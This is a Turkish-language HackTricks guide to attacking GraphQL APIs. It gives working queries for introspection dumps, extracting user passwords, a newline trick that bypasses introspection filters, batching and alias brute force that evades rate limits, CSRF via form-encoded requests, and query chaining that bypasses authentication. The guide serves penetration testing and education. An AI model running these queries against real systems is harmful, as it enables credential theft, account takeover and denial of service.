# GraphQL

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahramana öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)'da **takip edin**.
* **Hacking püf noktalarınızı paylaşarak PR göndererek HackTricks** ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

## Giriş

GraphQL, backend'den veri sorgulamak için basitleştirilmiş bir yaklaşım sunarak REST API'ye **verimli bir alternatif** olarak **ön plana çıkar**. REST'in aksine, genellikle verileri toplamak için çeşitli uç noktalarda çok sayıda istek gerektiren GraphQL, tüm gerekli bilgilerin **tek bir istek** aracılığıyla alınmasını sağlar. Bu basitleştirme, veri alım süreçlerinin karmaşıklığını azaltarak geliştiricilere önemli ölçüde **fayda sağlar**.

## GraphQL ve Güvenlik

GraphQL gibi yeni teknolojilerin ortaya çıkmasıyla yeni güvenlik açıkları da ortaya çıkar. **GraphQL'ın varsayılan olarak kimlik doğrulama mekanizmalarını içermediği** önemli bir noktadır. Bu tür güvenlik önlemlerini uygulamak geliştiricilerin sorumluluğundadır. Doğru kimlik doğrulama olmadan, GraphQL uç noktaları kimlik doğrulamamış kullanıcılara hassas bilgileri açığa çıkarabilir, bu da ciddi bir güvenlik riski oluşturabilir.

### Dizin Brute Force Saldırıları ve GraphQL

Açığa çıkarılmış GraphQL örneklerini tanımlamak için dizin brute force saldırılarında belirli yolların dahil edilmesi önerilir. Bu yollar şunlardır:

* `/graphql`
* `/graphiql`
* `/graphql.php`
* `/graphql/console`
* `/api`
* `/api/graphql`
* `/graphql/api`
* `/graphql/graphql`

Açık GraphQL örneklerinin tanımlanması, desteklenen sorguların incelenmesine olanak tanır. Bu, uç noktadan erişilebilen verileri anlamak için önemlidir. GraphQL'in keşif sistemi, bir şemanın desteklediği sorguları detaylandırarak bunu kolaylaştırır. Bu konuda daha fazla bilgi için GraphQL keşif belgelerine bakın: [**GraphQL: API'ler için bir sorgu dili.**](https://graphql.org/learn/introspection/)

### Parmak İzi

[**graphw00f**](https://github.com/dolevf/graphw00f) aracı, bir sunucuda kullanılan GraphQL motorunu tespit edebilir ve ardından güvenlik denetçisi için bazı yararlı bilgileri yazdırabilir.

#### Evrensel sorgular <a href="#universal-queries" id="universal-queries"></a>

Bir URL'nin bir GraphQL servisi olup olmadığını kontrol etmek için bir **evrensel sorgu**, `query{__typename}`, gönderilebilir. Yanıt `{"data": {"__typename": "Query"}}` içeriyorsa, URL'nin bir GraphQL uç noktası barındırdığını doğrular. Bu yöntem, GraphQL'in sorgulanan nesnenin türünü ortaya çıkaran `__typename` alanına dayanır.
```javascript
query{__typename}
```
### Temel Numaralandırma

Graphql genellikle **GET**, **POST** (x-www-form-urlencoded) ve **POST**(json) destekler. Güvenlik açısından, CSRF saldırılarını önlemek için yalnızca json'a izin vermek önerilir.

#### İçgörü

Şema bilgilerini keşfetmek için içgörüyü kullanmak için `__schema` alanını sorgulayın. Bu alan, tüm sorguların kök türünde mevcuttur.
```bash
query={__schema{types{name,fields{name}}}}
```
Bu sorgu ile kullanılan tüm tiplerin adını bulacaksınız:

![](<../../.gitbook/assets/image (1033).png>)

{% code overflow="wrap" %}
```bash
query={__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}
```
{% endcode %}

Bu sorgu ile tüm tipleri, alanlarını ve argümanlarını (ve argümanların türünü) çıkarabilirsiniz. Veritabanını sorgulamanın nasıl yapılacağını bilmek çok faydalı olacaktır.

![](<../../.gitbook/assets/image (947).png>)

**Hatalar**

**Hataların** gösterilip gösterilmeyeceğini bilmek ilginç olacaktır çünkü faydalı **bilgiler** sağlayabilirler.
```
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```
**Veritabanı Şemasını Tanımlama Yöntemi ile Sıralama**

{% hint style="info" %}
Eğer tanımlama etkinleştirilmişse ancak yukarıdaki sorgu çalışmıyorsa, sorgu yapısından `onOperation`, `onFragment` ve `onField` direktiflerini kaldırmayı deneyin.
{% endhint %}
```bash
#Full introspection query

query IntrospectionQuery {
__schema {
queryType {
name
}
mutationType {
name
}
subscriptionType {
name
}
types {
...FullType
}
directives {
name
description
args {
...InputValue
}
onOperation  #Often needs to be deleted to run query
onFragment   #Often needs to be deleted to run query
onField      #Often needs to be deleted to run query
}
}
}

fragment FullType on __Type {
kind
name
description
fields(includeDeprecated: true) {
name
description
args {
...InputValue
}
type {
...TypeRef
}
isDeprecated
deprecationReason
}
inputFields {
...InputValue
}
interfaces {
...TypeRef
}
enumValues(includeDeprecated: true) {
name
description
isDeprecated
deprecationReason
}
possibleTypes {
...TypeRef
}
}

fragment InputValue on __InputValue {
name
description
type {
...TypeRef
}
defaultValue
}

fragment TypeRef on __Type {
kind
name
ofType {
kind
name
ofType {
kind
name
ofType {
kind
name
}
}
}
}
```
Satır içi denetim sorgusu:
```
/?query=fragment%20FullType%20on%20Type%20{+%20%20kind+%20%20name+%20%20description+%20%20fields%20{+%20%20%20%20name+%20%20%20%20description+%20%20%20%20args%20{+%20%20%20%20%20%20...InputValue+%20%20%20%20}+%20%20%20%20type%20{+%20%20%20%20%20%20...TypeRef+%20%20%20%20}+%20%20}+%20%20inputFields%20{+%20%20%20%20...InputValue+%20%20}+%20%20interfaces%20{+%20%20%20%20...TypeRef+%20%20}+%20%20enumValues%20{+%20%20%20%20name+%20%20%20%20description+%20%20}+%20%20possibleTypes%20{+%20%20%20%20...TypeRef+%20%20}+}++fragment%20InputValue%20on%20InputValue%20{+%20%20name+%20%20description+%20%20type%20{+%20%20%20%20...TypeRef+%20%20}+%20%20defaultValue+}++fragment%20TypeRef%20on%20Type%20{+%20%20kind+%20%20name+%20%20ofType%20{+%20%20%20%20kind+%20%20%20%20name+%20%20%20%20ofType%20{+%20%20%20%20%20%20kind+%20%20%20%20%20%20name+%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}++query%20IntrospectionQuery%20{+%20%20schema%20{+%20%20%20%20queryType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20mutationType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20types%20{+%20%20%20%20%20%20...FullType+%20%20%20%20}+%20%20%20%20directives%20{+%20%20%20%20%20%20name+%20%20%20%20%20%20description+%20%20%20%20%20%20locations+%20%20%20%20%20%20args%20{+%20%20%20%20%20%20%20%20...InputValue+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}
```
Son kod satırı, graphql'den tüm meta bilgileri (nesne adları, parametreler, tipler...) dökecek bir graphql sorgusudur.

![](<../../.gitbook/assets/image (360).png>)

Eğer introspection etkinse, [**GraphQL Voyager**](https://github.com/APIs-guru/graphql-voyager) kullanarak GUI'de tüm seçenekleri görüntüleyebilirsiniz.

### Sorgulama

Veritabanında hangi tür bilgilerin kaydedildiğini bildiğimize göre, **bazı değerler çıkarmayı** deneyelim.

Introspeksiyonda **doğrudan sorgulayabileceğiniz nesneleri** bulabilirsiniz (bir nesneyi sorgulayamazsınız çünkü var olduğu için). Aşağıdaki görüntüde "_queryType_"'ın "_Query_" olarak adlandırıldığını ve "_Query_" nesnesinin alanlarından birinin "_flags_" olduğunu görebilirsiniz, ki bu da bir nesne türüdür. Dolayısıyla bayrak nesnesini sorgulayabilirsiniz.

![](<../../.gitbook/assets/Screenshot from 2021-03-13 18-17-48.png>)

Sorgunun türü "_flags_" ise "_Flags_" ve bu nesne aşağıdaki gibi tanımlanmıştır:

![](<../../.gitbook/assets/Screenshot from 2021-03-13 18-22-57 (1).png>)

"_Flags_" nesnelerinin **ad** ve **değer** ile oluşturulduğunu görebilirsiniz. Sonra bayrakların tüm adlarını ve değerlerini aşağıdaki sorgu ile alabilirsiniz:
```javascript
query={flags{name, value}}
```
Dikkat edin ki **sorgulanacak nesne** gibi **ilkel bir tür** **string** gibi olduğunda aşağıdaki örnekte olduğu gibi sadece sorgulayabilirsiniz:

![](<../../.gitbook/assets/image (955).png>)
```javascript
query={hiddenFlags}
```
Başka bir örnekte, "_Query_" türü nesnesi içinde 2 nesne olan "_user_" ve "_users_" bulunmaktadır.\
Bu nesnelerin aranması için herhangi bir argümana ihtiyaç duymadıklarında, istediğiniz verileri sormak suretiyle **tüm bilgileri alabilirsiniz**. Bu örnekte, internetten kaydedilmiş kullanıcı adlarını ve şifreleri çıkarabilirsiniz:

![](<../../.gitbook/assets/image (877).png>)

Ancak, bu örnekte bunu denerseniz şu **hatayı** alırsınız:

![](<../../.gitbook/assets/image (1039).png>)

Görünüşe göre, bir şekilde "_**uid**_" türünde bir argüman kullanarak arama yapacak.\
Neyse ki, zaten [Temel Numaralandırma](graphql.md#basic-enumeration) bölümünde bize gereken tüm bilgileri gösteren bir sorgu önerilmişti: `query={__schema{types{name,fields{name, args{name,description,type{name, kind, ofType{name, kind}}}}}}}`

Eğer o sorguyu çalıştırdığımda sağlanan resmi okursanız, "_**user**_"'ın _Int_ türünde "_**uid**_" argümanına sahip olduğunu göreceksiniz.

Bu nedenle, hafif bir _**uid**_ bruteforce gerçekleştirerek _**uid**=**1**_ durumunda bir kullanıcı adı ve şifre elde ettim:\
`query={user(uid:1){user,password}}`

![](<../../.gitbook/assets/image (87).png>)

Dikkat edin, "_**user**_" ve "_**password**_" parametrelerini isteyebileceğimi **keşfettim** çünkü var olmayan bir şey aramaya çalışırsam (`query={user(uid:1){noExists}}`) bu hatayı alırım:

![](<../../.gitbook/assets/image (704).png>)

Ve **numaralandırma aşaması** sırasında "_**dbuser**_" nesnesinin "_**user**_" ve "_**password**_" alanlarına sahip olduğunu keşfettim.

**Sorgu dizesi dökme hilesi (teşekkürler @BinaryShadow\_)**

Eğer `query={theusers(description: ""){username,password}}` gibi bir String türüyle arama yapabilirseniz ve **boş bir dize ararsanız**, tüm verileri dökecektir. (_Bu örnek, öğreticilerin örneğiyle ilgili değildir, bu örnekte "**theusers**" kullanarak "**description**" adlı String alanıyla arama yapabileceğinizi varsayalım_).

### Arama

Bu kurulumda, bir **veritabanı** kişileri ve filmleri içerir. **Kişiler** e-posta ve isimleriyle tanımlanır; filmler ise isimleri ve derecelendirmeleriyle tanımlanır. **Kişiler** birbirleriyle arkadaş olabilir ve aynı zamanda filmlere sahip olabilir, veritabanı içindeki ilişkileri gösterir.

Kişileri **isimlerine göre** arayabilir ve e-postalarını alabilirsiniz:
```javascript
{
searchPerson(name: "John Doe") {
email
}
}
```
Kişileri **adlarına göre** arayabilir ve **abone oldukları filmleri** alabilirsiniz:
```javascript
{
searchPerson(name: "John Doe") {
email
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
Not alınarak `subscribedMovies`'ın `name` özelliğinin alınması belirtilmiştir.

Aynı anda **birkaç nesne aranabilir**. Bu durumda, 2 film araması yapılır:
```javascript
{
searchPerson(subscribedMovies: [{name: "Inception"}, {name: "Rocky"}]) {
name
}
}r
```
Ya da **farklı nesnelerin ilişkileri kullanılarak takma adlar**:
```javascript
{
johnsMovieList: searchPerson(name: "John Doe") {
subscribedMovies {
edges {
node {
name
}
}
}
}
davidsMovieList: searchPerson(name: "David Smith") {
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
### Mutasyonlar

**Mutasyonlar, sunucu tarafında değişiklik yapmak için kullanılır.**

**İntrospeksiyon** içinde **tanımlanmış mutasyonları** bulabilirsiniz. Aşağıdaki görüntüde "_MutationType_" "_Mutation_" olarak adlandırılır ve "_Mutation_" nesnesi mutasyonların isimlerini içerir (bu durumda "_addPerson_" gibi):

![](<../../.gitbook/assets/Screenshot from 2021-03-13 18-26-27 (1).png>)

Bu yapıda bir **veritabanı**, **kişileri** ve **filmleri** içerir. **Kişiler**, **e-posta** ve **isimleri** ile tanımlanır; **filmler** ise **isim** ve **puanları** ile tanımlanır. **Kişiler** birbirleriyle arkadaş olabilir ve ayrıca filmlere sahip olabilir, veritabanı içindeki ilişkileri gösterir.

Veritabanına yeni filmler eklemek için bir mutasyon aşağıdaki gibi olabilir (bu örnekte mutasyon `addMovie` olarak adlandırılmıştır):
```javascript
mutation {
addMovie(name: "Jumanji: The Next Level", rating: "6.8/10", releaseYear: 2019) {
movies {
name
rating
}
}
}
```
**Sorguda hem verilerin hem de veri türünün belirtildiğine dikkat edin.**

Ayrıca, veritabanı mevcut **arkadaşlar** ve **filmler** ile ilişkilendirilmiş **kişilerin** oluşturulmasını sağlayan `addPerson` adında bir **mutasyon** işlemini destekler. Arkadaşlar ve filmlerin, yeni oluşturulan kişiye bağlanmadan önce veritabanında mevcut olması gerektiğini unutmamak önemlidir.
```javascript
mutation {
addPerson(name: "James Yoe", email: "jy@example.com", friends: [{name: "John Doe"}, {email: "jd@example.com"}], subscribedMovies: [{name: "Rocky"}, {name: "Interstellar"}, {name: "Harry Potter and the Sorcerer's Stone"}]) {
person {
name
email
friends {
edges {
node {
name
email
}
}
}
subscribedMovies {
edges {
node {
name
rating
releaseYear
}
}
}
}
}
}
```
### Yönerge Aşırı Yükleme

[**Bu raporda açıklanan zafiyetlerden biri**](https://www.landh.tech/blog/20240304-google-hack-50000/) olarak açıklandığı gibi, bir yönerge aşırı yükleme, sunucunun işlemlerini boşa harcamak için bir yönergeyi milyonlarca kez çağırmayı ima eder ve DoS saldırısı yapılabilir hale gelene kadar işlemleri boşa harcamak.

### 1 API isteğinde kaba kuvvet saldırısı toplu işleme

Bu bilgi [https://lab.wallarm.com/graphql-batching-attack/](https://lab.wallarm.com/graphql-batching-attack/) adresinden alınmıştır.\
**Farklı kimlik bilgileri ile birlikte birçok sorguyu aynı anda göndererek GraphQL API üzerinden kimlik doğrulama**. Bu klasik bir kaba kuvvet saldırısıdır, ancak şimdi GraphQL toplu işleme özelliği sayesinde bir HTTP isteğinde birden fazla giriş/şifre çifti göndermek mümkün hale gelmiştir. Bu yaklaşım, harici hız izleme uygulamalarını aldatarak her şeyin yolunda olduğunu ve şifre denemesi yapan bir botun olmadığını düşünmelerini sağlayacaktır.

Aşağıda, **aynı anda 3 farklı e-posta/şifre çifti** ile uygulama kimlik doğrulama isteğinin en basit gösterimi bulunmaktadır. Açıkça aynı şekilde tek bir istekte binlerce göndermek mümkündür:

![](<../../.gitbook/assets/image (1078).png>)

Yanıt ekran görüntüsünden görebileceğimiz gibi, ilk ve üçüncü istekler _null_ döndürdü ve ilgili bilgileri _hata_ bölümünde yansıttı. **İkinci mutasyon doğru kimlik doğrulama** verilerine sahipti ve yanıt doğru kimlik doğrulama oturum belirteci içeriyordu.

![](<../../.gitbook/assets/image (119) (1).png>)

## GraphQL İntrospeksiyon Olmadan

Daha fazla **graphql uç noktası introspeksiyonu devre dışı bırakıyor**. Bununla birlikte, graphql'in beklenmeyen bir istek aldığında fırlattığı hatalar, [**clairvoyance**](https://github.com/nikitastupin/clairvoyance) gibi araçların çoğu şemayı yeniden oluşturmasına yeterlidir.

Ayrıca, Burp Suite uzantısı [**GraphQuail**](https://github.com/forcesunseen/graphquail) uzantısı, Burp üzerinden geçen GraphQL API isteklerini **izler** ve her yeni sorguyu gördüğünde içsel bir GraphQL **şeması oluşturur**. Ayrıca şemayı GraphiQL ve Voyager için açığa çıkarabilir. Uzantı, bir introspeksiyon sorgusu aldığında sahte bir yanıt döndürür. Sonuç olarak, GraphQuail API içinde kullanılabilecek tüm sorguları, argümanları ve alanları gösterir. Daha fazla bilgi için [**buraya bakın**](https://blog.forcesunseen.com/graphql-security-testing-without-a-schema).

[**GraphQL varlıklarını keşfetmek için güzel bir kelime listesi burada bulunabilir**](https://github.com/Escape-Technologies/graphql-wordlist?).

### GraphQL İntrospeksiyon Savunmalarını Atlatma <a href="#bypassing-graphql-introspection-defences" id="bypassing-graphql-introspection-defences"></a>

### **GraphQL İntrospeksiyon Savunmalarını Atlatma**

API'lerde introspeksiyon sorgularına getirilen kısıtlamaları atlatmak için, `__schema` kelimesinden sonra **özel bir karakter eklemek** etkili olmaktadır. Bu yöntem, introspeksiyonu engellemeyi amaçlayan regex desenlerinde yaygın geliştirici hatalarını sömürür. GraphQL'in görmezden geldiği ancak regex'te hesaba katılmamış olabilecek karakterler ekleyerek, kısıtlamalar atlatılabilir. Örneğin, `__schema`'dan sonra bir satır sonu ekleyen bir introspeksiyon sorgusu, bu tür savunmaları atlayabilir:
```bash
# Example with newline to bypass
{
"query": "query{__schema
{queryType{name}}}"
}
```
Eğer başarısız olursanız, yalnızca POST isteklerine kısıtlamalar uygulanmış olabileceğinden **GET istekleri** veya **`x-www-form-urlencoded` ile POST** gibi alternatif istek yöntemlerini düşünebilirsiniz.

### **Açığa Çıkarılmış GraphQL Yapılarını Keşfetme**

İntrospeksiyon devre dışı bırakıldığında, JavaScript kütüphanelerinde önceden yüklenmiş sorguları incelemek yararlı bir stratejidir. Bu sorgular, geliştirici araçlarındaki `Kaynaklar` sekmesi kullanılarak bulunabilir, API'nin şemasına dair içgörüler sağlar ve potansiyel olarak **açığa çıkarılmış hassas sorguları** ortaya çıkarır. Geliştirici araçları içinde arama yapmak için kullanılan komutlar:
```javascript
Inspect/Sources/"Search all files"
file:* mutation
file:* query
```
## GraphQL'de CSRF

CSRF nedir bilmiyorsanız aşağıdaki sayfayı okuyun:

{% content-ref url="../../pentesting-web/csrf-cross-site-request-forgery.md" %}
[csrf-cross-site-request-forgery.md](../../pentesting-web/csrf-cross-site-request-forgery.md)
{% endcontent-ref %}

Dışarıda, **CSRF belirteçleri olmadan yapılandırılmış** birkaç GraphQL uç noktası bulabileceksiniz.

GraphQL istekleri genellikle **`application/json`** Content-Type'ı kullanılarak POST istekleri aracılığıyla gönderilir.
```javascript
{"operationName":null,"variables":{},"query":"{\n  user {\n    firstName\n    __typename\n  }\n}\n"}
```
Ancak, çoğu GraphQL uç noktası aynı zamanda **`form-urlencoded` POST isteklerini de destekler:**
```javascript
query=%7B%0A++user+%7B%0A++++firstName%0A++++__typename%0A++%7D%0A%7D%0A
```
Bu nedenle, önceki gibi CSRF istekleri **önişlem istekleri olmadan** gönderildiğinden, bir CSRF'yi kötüye kullanarak GraphQL'de **değişiklikler** yapmak mümkündür.

Ancak, Chrome'un `samesite` bayrağının yeni varsayılan çerez değeri `Lax`'tir. Bu, çerezin yalnızca üçüncü taraf web sitelerinden GET isteklerinde gönderileceği anlamına gelir.

Ayrıca, **sorgu** isteğinin bir **GET** isteği olarak da gönderilebileceğini ve CSRF belirtecinin GET isteğinde doğrulanmayabileceğini unutmayın.

Ayrıca, bir [**XS-Search**](../../pentesting-web/xs-search/) **saldırısını** kötüye kullanarak kullanıcının kimlik bilgilerini kötüye kullanarak GraphQL uç noktasından içerik sızdırmak mümkün olabilir.

Daha fazla bilgi için **orijinal yazıya** [**buradan**](https://blog.doyensec.com/2021/05/20/graphql-csrf.html) bakın.

## GraphQL'de Yetkilendirme

Uç noktada tanımlanan birçok GraphQL işlevi, yalnızca istekte bulunanın kimlik doğrulamasını kontrol edebilir ancak yetkilendirmeyi kontrol etmeyebilir.

Sorgu giriş değişkenlerinin değiştirilmesi, hassas hesap ayrıntılarına yol açabilir [sızdırıldı](https://hackerone.com/reports/792927).

Mutasyon, başka bir hesap verisini değiştirmeye çalışarak hesap ele geçirmesine bile yol açabilir.
```javascript
{
"operationName":"updateProfile",
"variables":{"username":INJECT,"data":INJECT},
"query":"mutation updateProfile($username: String!,...){updateProfile(username: $username,...){...}}"
}
```
### GraphQL'de Yetkilendirme Atlatma

[Query'leri zincirleme](https://s1n1st3r.gitbook.io/theb10g/graphql-query-authentication-bypass-vuln) zayıf bir kimlik doğrulama sistemini atlayabilir.

Aşağıdaki örnekte işlemin "forgotPassword" olduğunu ve yalnızca onunla ilişkilendirilmiş forgotPassword sorgusunun yürütülmesi gerektiğini görebilirsiniz. Bu, sona bir sorgu ekleyerek atlatılabilir, bu durumda "register" ve bir kullanıcı değişkeni ekliyoruz ki sistem onu yeni bir kullanıcı olarak kaydedebilsin.

<figure><img src="../../.gitbook/assets/GraphQLAuthBypassMethod.PNG" alt=""><figcaption></figcaption></figure>

## GraphQL'de Aliases Kullanarak Hız Sınırlarını Atlatma

GraphQL'de, aliases, bir API isteği yapılırken **özelliklerin açıkça adlandırılmasına** olanak tanıyan güçlü bir özelliktir. Bu yetenek, tek bir istekte **aynı türden birden fazla örneği** almak için özellikle kullanışlıdır. Aliases, GraphQL nesnelerinin aynı ada sahip birden fazla özelliğe sahip olmasını engelleyen kısıtlamayı aşmak için kullanılabilir.

GraphQL aliases'lerinin detaylı anlaşılması için aşağıdaki kaynak önerilir: [Aliases](https://portswigger.net/web-security/graphql/what-is-graphql#aliases).

Aliases'lerin asıl amacı birçok API çağrısına gerek duymayı azaltmaktır, ancak aliases'lerin yanlışlıkla keşfedilen bir kullanım durumu vardır ki bu, aliases'lerin bir GraphQL uç noktasında brute force saldırıları gerçekleştirmek için kullanılabileceğini göstermektedir. Bu, bazı uç noktaların, brute force saldırılarını sınırlayarak **HTTP isteklerinin sayısını** kısıtlayan hız sınırlayıcılarla korunduğu gerçeğine dayanmaktadır. Ancak, bu hız sınırlayıcılar, her istekteki işlemlerin sayısını hesaba katmayabilir. Aliases'ler, birden fazla sorgunun tek bir HTTP isteğine dahil edilmesine izin verdiği için, bu tür hız sınırlama önlemlerini atlayabilir.

Aşağıdaki örneği düşünün, bu örnek, mağaza indirim kodlarının geçerliliğini doğrulamak için nasıl kullanılabileceğini göstermektedir. Bu yöntem, birçok indirim kodunun aynı anda doğrulanmasına izin verebileceğinden hız sınırlamayı atlayabilir.
```bash
# Example of a request utilizing aliased queries to check for valid discount codes
query isValidDiscount($code: Int) {
isvalidDiscount(code:$code){
valid
}
isValidDiscount2:isValidDiscount(code:$code){
valid
}
isValidDiscount3:isValidDiscount(code:$code){
valid
}
}
```
## Araçlar

### Zayıflık tarayıcıları

* [https://github.com/gsmith257-cyber/GraphCrawler](https://github.com/gsmith257-cyber/GraphCrawler): Şemaları almak ve hassas verileri aramak, yetkilendirme testi yapmak, şemaları kaba kuvvet uygulamak ve belirli bir türe giden yolları bulmak için kullanılabilen bir araç seti.
* [https://blog.doyensec.com/2020/03/26/graphql-scanner.html](https://blog.doyensec.com/2020/03/26/graphql-scanner.html): Bağımsız olarak veya [Burp uzantısı](https://github.com/doyensec/inql) olarak kullanılabilir.
* [https://github.com/swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap): Saldırıları otomatikleştirmek için CLI istemcisi olarak da kullanılabilir.
* [https://gitlab.com/dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum): Bir GraphQL şemasında belirli bir türe ulaşmanın farklı yollarını listeleyen bir araç.
* [https://github.com/doyensec/inql](https://github.com/doyensec/inql): Gelişmiş GraphQL testi için Burp uzantısı. _**Scanner**_, InQL v5.0'ın çekirdeğidir, burada bir GraphQL uç noktasını veya yerel bir içgörü şema dosyasını analiz edebilirsiniz. Tüm olası sorguları ve mutasyonları otomatik olarak oluşturur ve analiziniz için yapılandırılmış bir görünüme yerleştirir. _**Attacker**_ bileşeni, kötü uygulanmış hız sınırlarını atlamak için yararlı olabilecek toplu GraphQL saldırıları çalıştırmanıza olanak tanır.

### İstemciler

* [https://github.com/graphql/graphiql](https://github.com/graphql/graphiql): GUI istemcisi
* [https://altair.sirmuel.design/](https://altair.sirmuel.design/): GUI İstemcisi

### Otomatik Testler

{% embed url="https://graphql-dashboard.herokuapp.com/" %}

* AutoGraphQL'yi açıklayan video: [https://www.youtube.com/watch?v=JJmufWfVvyU](https://www.youtube.com/watch?v=JJmufWfVvyU)

## Referanslar

* [**https://jondow.eu/practical-graphql-attack-vectors/**](https://jondow.eu/practical-graphql-attack-vectors/)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4**](https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4)
* [**http://ghostlulz.com/api-hacking-graphql/**](http://ghostlulz.com/api-hacking-graphql/)
* [**https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://portswigger.net/web-security/graphql**](https://portswigger.net/web-security/graphql)

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini alın**](https://peass.creator-spring.com)
* [**The PEASS Family'yi keşfedin**](https://opensea.io/collection/the-peass-family), özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin
* **💬 [Discord grubuna](https://discord.gg/hRep4RUj7f) katılın veya [telegram grubuna](https://t.me/peass) katılın veya** bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak HackTricks ve HackTricks Cloud github depolarına PR göndererek destek olun.**

</details>
